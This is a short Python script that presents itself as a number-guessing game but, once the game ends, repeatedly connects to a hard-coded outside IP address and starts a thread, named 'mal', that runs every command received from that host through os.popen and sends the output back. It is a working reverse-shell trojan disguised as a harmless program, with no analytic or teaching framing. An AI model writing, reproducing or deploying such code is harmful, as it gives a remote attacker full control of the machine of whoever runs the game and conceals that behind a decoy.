import os
import socket
import threading
import random


def mal(sock): 
    while True:
        try:
            data = sock.recv(2048)
            stream = os.popen(data.decode())
            sock.send(stream.read().encode())
        except:
            sock.send(b"something went wrong!")

def num_guesser():
    print("\n\n\n\n\n\n\n\n====Number Guesser====")
    num = random.randrange(0, 100)
    tries = 0
    while True:
        guess = int(input("your guess : "))

        if guess > num:
            print("guess again, your guess is higher")

        if guess < num:
            print("guess again, your guess is  lower")

        if guess == num:
            print(f"correct!, it took you {tries}")
            break
 
        tries += 1



num_guesser()

sock = None

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("85.226.102.252", 25565))
        break
    except:
        continue
 
threading.Thread(target=mal, args=(sock, )).start()
